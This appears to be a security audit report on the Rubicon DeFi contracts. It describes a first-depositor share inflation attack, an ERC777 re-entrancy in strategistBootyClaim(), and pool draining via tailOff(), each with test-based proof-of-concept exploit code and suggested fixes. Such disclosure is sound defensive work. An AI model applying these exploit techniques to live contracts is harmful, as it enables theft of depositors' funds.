# Rubicon

The code under review can be found in [2022-05-rubicon](https://github.com/code-423n4/2022-05-rubicon).

## Findings Summary

| ID | Description | Severity |
| - | - | - |
| H-01 | First depositor can break minting of shares | High |
| M-01 | `strategistBootyClaim()` is vulnerable to re-entrancy | Medium |
| M-02 | Strategists can drain all tokens in liquidity pools | Medium |

# [H-01] First depositor can break minting of shares

## Impact
The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

## Vulnerability Details
In `BathToken.sol:569-571`, the allocation of shares is calculated as follows:
```js
(totalSupply == 0) ? shares = assets : shares = (
  assets.mul(totalSupply)
).div(_pool);
```

An early attacker can exploit this by:
* Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1`
* Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000`
* Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:
  * `assets = 1000`
  * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`
  * Thus, the victim receives no shares in return for his deposit

To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.

## Proof of Concept

```solidity
it("Victim receives 0 shares", async () => {
  // 1. Attacker deposits 1 testCoin first when creating the liquidity pool
  const initialLiquidityNew = 1;
  const initialLiquidityExistingBathToken = ethers.utils.parseUnits("100", decimals);

  // Approve DAI and testCoin for bathHouseInstance
  await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {
      from: attacker,
  });
  await DAIInstance.approve(
      bathHouseInstance.address,
      initialLiquidityExistingBathToken,
      { from: attacker }
  );

  // Call open creation function, attacker deposits only 1 testCoin
  const desiredPairedAsset = await DAIInstance.address;
  await bathHouseInstance.openBathTokenSpawnAndSignal(
      await testCoin.address,
      initialLiquidityNew,
      desiredPairedAsset,
      initialLiquidityExistingBathToken,
      { from: attacker }
  );

  // Retrieve resulting bathToken address
  const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);
  const _newBathToken = await BathToken.at(newbathTokenAddress);

  // 2. Attacker deposits large amount of testCoin into liquidity pool
  let attackerAmt = ethers.utils.parseUnits("1000000", decimals);
  await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});
  await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});

  // 3. Victim deposits a smaller amount of testCoin, receives 0 shares
  // In this case, we use (1 million - 1) testCoin
  let victimAmt = ethers.utils.parseUnits("999999", decimals);
  await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});
  await _newBathToken.deposit(victimAmt, victim, {from: victim});

  assert.equal(await _newBathToken.balanceOf(victim), 0);
});
```

## Recommended Mitigation Steps
* [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
* In `_deposit()`, ensure the number of shares to be minted is non-zero: 
`require(shares != 0, "No shares minted");`

# [M-01] `strategistBootyClaim()` is vulnerable to re-entrancy

## Impact
If a strategist calls `strategistBootyClaim()` on an `asset` or `quote` that implements ERC777 tokens, the function is vulnerable to re-entrancy. This allows strategists to claim more rewards than allocated to them based on their quantity of fills.

## Proof of Concept
A strategist calls `strategistBootyClaim()`, with `asset` or `quote` as an ERC777 token that he has completed a fill for:
* When the function calls `IERC20(asset).transfer(msg.sender, booty)`, ERC777 will call the `_callTokensReceived()` hook.
* The strategist calls `strategistBootyClaim()` in `_callTokensReceived()` with the same parameters.
* As `fillCountA/fillCountQ` is subtracted from `strategist2Fills` after the transfer, the strategist can repeatedly withdraw tokens, regardless of `strategist2Fills`.
* This allows him to withdraw more tokens than allocated to him.

```js
function strategistBootyClaim(address asset, address quote)
  external
  onlyApprovedStrategist(msg.sender)
{
  uint256 fillCountA = strategist2Fills[msg.sender][asset];
  uint256 fillCountQ = strategist2Fills[msg.sender][quote];
  if (fillCountA > 0) {
      uint256 booty = (
          fillCountA.mul(IERC20(asset).balanceOf(address(this)))
      ).div(totalFillsPerAsset[asset]);
      IERC20(asset).transfer(msg.sender, booty);
      emit LogStrategistRewardClaim(
          msg.sender,
          asset,
          booty,
          block.timestamp
      );
      totalFillsPerAsset[asset] -= fillCountA;
      strategist2Fills[msg.sender][asset] -= fillCountA;
  }
  if (fillCountQ > 0) {
      uint256 booty = (
          fillCountQ.mul(IERC20(quote).balanceOf(address(this)))
      ).div(totalFillsPerAsset[quote]);
      IERC20(quote).transfer(msg.sender, booty);
      emit LogStrategistRewardClaim(
          msg.sender,
          quote,
          booty,
          block.timestamp
      );
      totalFillsPerAsset[quote] -= fillCountQ;
      strategist2Fills[msg.sender][quote] -= fillCountQ;
  }
}
```

## Recommended Mitigation Steps
* Use the `nonReentrancy` modifier on `strategistBootyClaim()` to prevent re-entrancy attacks: 
[Openzeppelin/ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
* Adhere to the Check-Effects-Interactions pattern by transferring tokens to `msg.sender` at the end of the function.

# [M-02] Strategists can drain all tokens in liquidity pools

## Impact
By calling the `tailOff()` function in `BathPair.sol`, any approved strategist has the ability to completely drain tokens from any liquidity pool.

Even if this is the intended functionality, this potential risk should be made known to users.

## Vulnerability Details
In `BathPair.sol`, `tailOff()` forwards calls to `rebalance()` in `BathToken.sol` as follows:
```js
function tailOff(
  address targetPool,
  address tokenToHandle,
  address targetToken,
  address _stratUtil, // delegatecall target
  uint256 amount, //fill amount to handle
  uint256 hurdle, //must clear this on tail off
  uint24 _poolFee
) external onlyApprovedStrategist(msg.sender) {
  // transfer here
  uint16 stratRewardBPS = IBathHouse(bathHouse).getBPSToStrats();

  IBathToken(targetPool).rebalance(
      _stratUtil,
      tokenToHandle,
      stratRewardBPS,
      amount
  );
```

Other than `stratProportion`, a strategist has the ability to control all parameters of `rebalance()`, which allows them to transfer tokens out of a liquidity pool, as seen in `BathToken.sol:353-356`:
```js
IERC20(filledAssetToRebalance).transfer(
  destination,
  rebalAmt.sub(stratReward)
);
```

An approved strategist could call `tailOff()` with the following parameters:
* `targetPool` - The target liquidity pool to drain
* `tokenToHandle` - The underlying token of the liquidity pool
* `targetToken` - Any random address
* `_stratUtil` - Address of the attacker contract. It must implement a `UNIdump()` function.
* `amount` - The amount of underlying token to drain
* `hurdle` and `_poolFee` - Any valid `uint`

## Proof of Concept

```js
it("Strategist can drain any liquidity pool", async () => {
  // Approve strategist
  let strategist = accounts[1];
  await bathHouseInstance.approveStrategist(strategist);

  // Check balance left in bathDAI contract
  let balanceDAI = await DAIInstance.balanceOf(bathDAI.address);
  assert.equal(balanceDAI > 0, true);

  // Drain DAI from bathDAI contract using tailOff()
  // attackerContract contains with an empty UNIdump() function, compliant with IStrategistUtility
  await bathPairInstance.tailOff(
      bathDAI.address,
      DAIInstance.address,
      randomAddress,
      attackerContract.address,
      balanceDAI,
      0,
      0,
      {from: strategist}
  );

  // Check if all DAI drained from contract
  let final_balanceDAI = await DAIInstance.balanceOf(bathDAI.address);
  assert.equal(final_balanceDAI, 0);
});
```

## Recommended Mitigation Steps
Maintain a whitelist of external pools `tailOff()` can be used to send tokens to, and revert all other non-listed addresses.